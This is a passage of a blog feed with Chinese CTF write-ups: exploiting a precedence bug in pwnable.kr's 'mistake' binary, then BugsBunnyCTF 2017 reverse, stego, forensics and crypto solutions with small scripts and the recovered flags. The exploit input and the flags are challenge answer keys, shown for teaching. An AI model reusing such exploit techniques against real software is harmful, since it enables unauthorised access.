class="line"></div><div class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line">	<span class="keyword">int</span> len;</div><div class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">		close(fd);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"input password : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</div><div class="line"></div><div class="line">	<span class="comment">// xor your input</span></div><div class="line">	xor(pw_buf2, <span class="number">10</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</div><div class="line">		system(<span class="string">"/bin/cat flag\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	close(fd);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>程序的功能，就是我们输入的十个字符进行xor处理后保存在pw_buf2中，与pw_buf进行比较，若相同则得到flag。</p>
<p>问题出在下面这段代码中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于<code>&lt;</code>的优先级比<code>=</code>高，所以在open()执行完后，不论是否打开成功，其返回值都大于或者等于零。所以在与0比较后，fd的值为false，在c语言中，即为0。</p>
<p>所以当程序执行到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</div><div class="line">	printf(&quot;read error\n&quot;);</div><div class="line">	close(fd);</div><div class="line">	return 0;		</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>实际上执行的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(!(len=read(0,pw_buf,PW_LEN) &gt; 0))</div></pre></td></tr></table></figure></p>
<p>而在unix中，0表示为标准输入流，<code>read(0,pw_buf,PW_LEN)</code>即为从标准输入流中读取字符并保存到pw_buf中。</p>
<p>所以实际上，两个数组的内容都是我们输入的。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>第一次输入时输入十个字符，比如十个1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1111111111</div></pre></td></tr></table></figure></p>
<p>第二次输入时输入第一次输入十个字符经过异或后的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0000000000</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mistake@ubuntu:~$ ./mistake</div><div class="line">do not bruteforce...</div><div class="line">2</div><div class="line">input password : 0</div><div class="line">Wrong Password</div><div class="line">mistake@ubuntu:~$ ./mistake</div><div class="line">do not bruteforce...</div><div class="line">1111111111</div><div class="line">input password : 0000000000</div><div class="line">Password OK</div><div class="line">Mommy, the operator priority always confuses me :(</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作符优先级问题。c语言中&lt;code&gt;=&lt;/code&gt;优先级为14，而&lt;code&gt;&amp;lt;&lt;/code&gt;优先级为6。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>BugsBunnyCTF2017-Reverse-writeup</title>
    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/"/>
    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/</id>
    <published>2017-07-30T11:46:02.000Z</published>
    <updated>2017-08-01T07:33:18.379Z</updated>
    
    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
<h1 id="only-guess"><a href="#only-guess" class="headerlink" title="only guess"></a>only guess</h1><p>用IDA打开<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/13.jpg?raw=true" alt=""></p>
<p>dict数组保存了各种字符串：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/14.jpg?raw=true" alt=""></p>
<p>基本逻辑就是读入的pass和数组dict比较，同时&amp;dest和数组dict的值比较，若一样则为good password。所以实际上&amp;dest就是我们要输入的值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> dest;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span>  src = <span class="number">0x736564656372656d</span>;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;dest, &amp;src, <span class="number">9u</span>LL);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,&amp;dest);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>但是我测试时只输出了<code>mercede?(</code>，所以这不是最后的password，需要修正。想了一个曲线救国的方法。用命令<code>strings re50 &gt; tmp</code>把数组dict中的内容输出到tmp文件中，在tmp文件中查找开头为<code>mercede</code>的值。最终确定password为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mercedes</div></pre></td></tr></table></figure></p>
<p>最终的flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;mercedes&#125;</div></pre></td></tr></table></figure></p>
<h1 id="rev100"><a href="#rev100" class="headerlink" title="rev100"></a>rev100</h1><p>拖进IDA查看。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170801/1.jpg?raw=true" alt=""></p>
<p>main函数中，将A，B两处的字符串拷贝后进行异或并存储到C中。用下面的脚本得到flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">str1 = [<span class="number">0x61</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x77</span>,<span class="number">0x34</span>,<span class="number">0x2c</span>,<span class="number">0x5f</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x7</span>,<span class="number">0x34</span>,<span class="number">0x7d</span>,<span class="number">0x12</span>,<span class="number">0x57</span>,<span class="number">0x7a</span>,<span class="number">0x22</span>,<span class="number">0x25</span>,<span class="number">0x4f</span>,<span class="number">0x28</span>]</div><div class="line">str2 = [<span class="number">0x23</span>,<span class="number">0x34</span>,<span class="number">0x27</span>,<span class="number">0x44</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x46</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x44</span>,<span class="number">0x50</span>,<span class="number">0x21</span>,<span class="number">0x55</span>]</div><div class="line"></div><div class="line">str3 = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">	str3 += chr(str1[i] ^ str2[i])</div><div class="line"></div><div class="line"><span class="keyword">print</span> str3</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;X0r_1s_fun&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单刷好幸苦。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Reverse" scheme="http://yoursite.com/categories/writeup-Reverse/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BugsBunnyCTF2017-misc-writeup</title>
    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-misc-writeup/"/>
    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-misc-writeup/</id>
    <published>2017-07-30T01:04:19.000Z</published>
    <updated>2017-07-31T00:05:45.164Z</updated>
    
    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Not-found"><a href="#Not-found" class="headerlink" title="Not found"></a>Not found</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hidden in plain sight</div></pre></td></tr></table></figure>
<p>在注册时时候就注意到有irc页面，连上去后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Th1s_1s_0ur_fl4g_f0rm4t&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Primitive-encryption"><a href="#Primitive-encryption" class="headerlink" title="Primitive encryption"></a>Primitive encryption</h2><p>题目给了如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">What about a time travel ? ^^</div><div class="line">Your mission is to be very observative, sometimes a theory start from a supposition.</div><div class="line">Decrypt this and you will get your flag :</div><div class="line">i KTAX ZTRTRTC SuB AKXy KXlp you GiRViRF youN GlTF TRV iA&apos;C FFAKTAwTCXTCy</div><div class="line">To validate the challenge enter : Bugs_Bunny&#123;your_flag_uppercase&#125;</div></pre></td></tr></table></figure></p>
<p>考虑语义，进行如下替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">K -&gt; h</div><div class="line">X -&gt; e</div><div class="line">N -&gt; r</div><div class="line">A -&gt; t</div><div class="line">C -&gt; s</div><div class="line">T -&gt; a</div><div class="line">R -&gt; R</div><div class="line">V -&gt; e</div><div class="line">G -&gt; F</div><div class="line">F -&gt; g</div></pre></td></tr></table></figure></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i hate Zararas SuB they help you fireirg your flag are it&apos;s ggthatwaseasy</div></pre></td></tr></table></figure></p>
<p>将<code>ggthatwaseasy</code>改成大写加上外围后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;GGTHATWASEASY&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Like-a-Boss"><a href="#Like-a-Boss" class="headerlink" title="Like a Boss !"></a>Like a Boss !</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Put the flag between Bugs_Bunny&#123;&#125;</div></pre></td></tr></table></figure>
<h2 id="Locked-PDF"><a href="#Locked-PDF" class="headerlink" title="Locked PDF"></a>Locked PDF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">My girlfriend sent me a locked PDF file ,Can you please helps me to read the content ,maybe something great waiting fro me ?!! :p</div></pre></td></tr></table></figure>
<h1 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h1><h2 id="Stego10"><a href="#Stego10" class="headerlink" title="Stego10"></a>Stego10</h2><p>题目提供了一张图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/bug/steg# strings h4cker.jpg</div><div class="line">JFIF</div><div class="line">`Exif</div><div class="line">Google</div><div class="line">0220</div><div class="line">.Bugs_Bunny&#123;0258c4a75fc36076b41d02df8074372b&#125;</div></pre></td></tr></table></figure></p>
<h2 id="odd-amp-even-2"><a href="#odd-amp-even-2" class="headerlink" title="odd &amp; even 2"></a>odd &amp; even 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">odd and even are two friends since ever.</div><div class="line">Can you detach them.</div><div class="line">Be the devil and do it.</div><div class="line"></div><div class="line">flag : BUGS_BUNNY&#123;&#125;</div></pre></td></tr></table></figure>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="FOR25"><a href="#FOR25" class="headerlink" title="FOR25"></a>FOR25</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">I found this file in my computer ,could you please give me the flag ?!</div></pre></td></tr></table></figure>
<p>直接用strings看一下。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/6.jpg?raw=true" alt=""></p>
<p>用以下脚本提取出hex。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">file = open(&apos;hex&apos;,&apos;rb&apos;)</div><div class="line">output = open(&apos;output&apos;,&apos;wb&apos;)</div><div class="line">while True:</div><div class="line">	line = file.readline()</div><div class="line">	output.write(line[9:48]+&quot;\n&quot;)</div><div class="line">	if not line:</div><div class="line">		break</div><div class="line">file.close()</div><div class="line">output.close()</div></pre></td></tr></table></figure></p>
<p>然后将output中的内容放到hex编辑器中并保存在压缩包文件。压缩包中有文件hex.png。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Y0u_D1D_1T_W3ll&#125;</div></pre></td></tr></table></figure></p>
<h2 id="UNKOWN-file"><a href="#UNKOWN-file" class="headerlink" title="UNKOWN file !!"></a>UNKOWN file !!</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">? em rof ti evlos esaelp uoy dluoc, rekcah boon a m&apos;I, elif egnarts a em dnes evah dneirf ym</div></pre></td></tr></table></figure>
<p>题目是倒这个，这是个提示。用hex打开unknown文件，发现是个png文件，只是被倒序了。将其十六进制内容保存在<code>unknownhex.txt</code>中，用下面这个脚本转换一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">unknowhex = open(&apos;unkownhex.txt&apos;,&apos;rb&apos;)</div><div class="line">knowhex = open(&apos;knowhex.txt&apos;,&apos;wb&apos;)</div><div class="line">content = unknowhex.readline()</div><div class="line">content = content.split(&apos; &apos;)</div><div class="line">for i in content[::-1]:</div><div class="line">	knowhex.write(i+&apos; &apos;)</div><div class="line">unknowhex.close()</div><div class="line">knowhex.close()</div></pre></td></tr></table></figure></p>
<p>再把knowhex.txt的内容放到hex编辑器中并保存成png文件。打开后是倒着的flag。最后的flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;E4Sy_T4Sk_F0R_H4X0r_L1KeS_Y0u&#125;</div></pre></td></tr></table></figure></p>
<h2 id="For80"><a href="#For80" class="headerlink" title="For80"></a>For80</h2><p>把gif传到这<a href="https://ezgif.com/split" target="_blank" rel="external">网站</a>后，进行split。但是图片很不清晰。然后我选择把分帧的图片下载下来。其目录结构差不多如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/8.jpg?raw=true" alt=""><br>然后用下面这个脚本写个html页面，用这些分帧图片进行填充。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">html = open(<span class="string">"flag.html"</span>,<span class="string">"wb"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">310</span>):</div><div class="line">	img = <span class="string">'&lt;img src="img/frame_'</span> + str(i)+ <span class="string">'_delay-0.01s.gif" /&gt;'</span></div><div class="line">	html.writelines(img)</div><div class="line">html.close()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/9.jpg?raw=true" alt=""></p>
<p>有些地方重叠了，但不妨碍最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;S3nD_NuDes_DuD3&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Give-me-the-Flag"><a href="#Give-me-the-Flag" class="headerlink" title="Give me the Flag !"></a>Give me the Flag !</h2><p>task85的压缩包解压出来后有个flag.rar和flag文件夹。flag文件夹里有各种国旗还有二维码碎片。而flag.rar被加密了。初步推测通过回复二维码来解密压缩包。拼了好久。。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/10.jpg?raw=true" alt=""></p>
<p>扫码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">== 34Sy_P4SSW0Rd_H4X0r ==</div></pre></td></tr></table></figure></p>
<p>直接解压得到的flag.txt里有flag。直接打开压缩包里面有个readme.txt，输入密码后其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01000010 01110101 01100111 01110011 01011111 01000010 01110101 01101110 01101110 01111001 01111011 00110010 01100010 00111001 00110111 00110010 00110110 00110011 01100010 01100101 01100010 00110111 00110000 01100100 00110000 01100110 00110110 00110101 00111001 01100010 01100100 01100010 00111001 00110011 01100011 01100011 00110101 00110010 00111001 00110001 01100100 00110000 01100001 01111101</div></pre></td></tr></table></figure></p>
<p>放到 <a href="http://tool.ph0en1x.com" target="_blank" rel="external">http://tool.ph0en1x.com</a> 上解一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;2b97263beb70d0f659bdb93cc5291d0a&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Programation"><a href="#Programation" class="headerlink" title="Programation"></a>Programation</h1><h2 id="ZERO-ONE"><a href="#ZERO-ONE" class="headerlink" title="ZERO-ONE !"></a>ZERO-ONE !</h2><p>写程序把ZERON,ONE换成对应的0，1，之后再解码就行了。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">progfile = open(<span class="string">"progTask.txt"</span>,<span class="string">"rb"</span>)</div><div class="line">content = progfile.readline()</div><div class="line">print(content.replace(<span class="string">"ZERO"</span>,<span class="string">'0'</span>).replace(<span class="string">"ONE"</span>,<span class="string">"1"</span>).replace(<span class="string">" "</span>,<span class="string">""</span>))</div></pre></td></tr></table></figure></p>
<p>在 <a href="http://tool.ph0en1x.com" target="_blank" rel="external">http://tool.ph0en1x.com</a> 放入bin一栏，在ascii一栏得到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QnVnc19CdW5ueXswNWZlODIzOGNmZWUxZTVmMDRiNjUzMzliZWE0ZmVkMn0=</div></pre></td></tr></table></figure></p>
<p>进行base64解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;05fe8238cfee1e5f04b65339bea4fed2&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单刷好幸苦。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>BugsBunnyCTF2017-crypto-writeup</title>
    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-crypto-writeup/"/>
    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-crypto-writeup/</id>
    <published>2017-07-29T23:49:21.000Z</published>
    <updated>2017-07-31T00:01:23.275Z</updated>
    
    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
<h1 id="Crypto-15"><a href="#Crypto-15" class="headerlink" title="Crypto-15"></a>Crypto-15</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Some classics crypto task ! Cesar maybe !!</div><div class="line">Author : Sold1er</div><div class="line">crypto-15.txt</div></pre></td></tr></table></figure>
<p>进行一次rot13后得到原文：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(story, shift)</span>:</span></div><div class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([</div><div class="line">            (<span class="keyword">lambda</span> c, is_upper: c.upper() <span class="keyword">if</span> is_upper <span class="keyword">else</span> c)</div><div class="line">                (</div><div class="line">                  (<span class="string">"abcdefghijklmnopqrstuvwxyz"</span>*<span class="number">2</span>)[ord(char.lower()) - ord(<span class="string">'a'</span>) + shift % <span class="number">26</span>],</div><div class="line">                  char.isupper()</div><div class="line">                )</div><div class="line">            <span class="keyword">if</span> char.isalpha() <span class="keyword">else</span> char</div><div class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> story</div><div class="line">        ])</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(story,key)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	key = [_YOUR_KEY_HERE_]</div><div class="line">	<span class="keyword">print</span> decode(<span class="string">"Piug_Pibbm&#123;Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ&#125;"</span>,key)</div></pre></td></tr></table></figure></p>
<p>对<code>Piug_Pibbm{Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ}</code>进行凯撒解码。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;C35aR_3NC0D3_4R3_N0T_S3CuR3_AT_4LL&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Crypto-20"><a href="#Crypto-20" class="headerlink" title="Crypto-20"></a>Crypto-20</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;----. &gt;+++++++++++++++++. --------------. ++++++++++++. --------------------. &lt;. &gt;++++++++++++++++++++++. -------. . +++++++++++. ++. &lt;. &gt;---------. &lt;--------------. ---. +++++++++++++++++++++++++++++. +++++++++++++++++. -------------------------. &gt;+++. &lt;&lt;++++++++++++. . &gt;&gt;++++++++.</div></pre></td></tr></table></figure>
<p>brainfuck解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Br41N_Fu**&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Crypto-25"><a href="#Crypto-25" class="headerlink" title="Crypto-25"></a>Crypto-25</h1><p>题目文件下载下来后打开发现是ook编码，放到下面网站中解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tool.ph0en1x.com/brainfuck/</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Ju5T_OoK!&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Scy-way"><a href="#Scy-way" class="headerlink" title="Scy way"></a>Scy way</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Decrypt My Secret And Win!</div><div class="line"></div><div class="line">IHUDERMRCPESOLLANOEIHR</div><div class="line"></div><div class="line">Bugs_Bunny&#123;flag&#125;</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
<p>栅栏密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IHUDERMRCPE</div><div class="line">SOLLANOEIHR</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;ISHOULDLEARNMORECIPHER&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Crypto-50"><a href="#Crypto-50" class="headerlink" title="Crypto-50"></a>Crypto-50</h1><p>就一直base64的解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;N0T_H4Rd_4T_4ll&#125;</div></pre></td></tr></table></figure></p>
<h1 id="babyRsa"><a href="#babyRsa" class="headerlink" title="babyRsa"></a>babyRsa</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">N: 20473673450356553867543177537</div><div class="line">e: 17</div></pre></td></tr></table></figure>
<p>在<a href="http://factordb.com/index.php?query=20473673450356553867543177537" target="_blank" rel="external">factordb</a>上把N进行分解如下，得到p和q：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = 2165121523231</div><div class="line">q = 9456131321351327</div></pre></td></tr></table></figure></p>
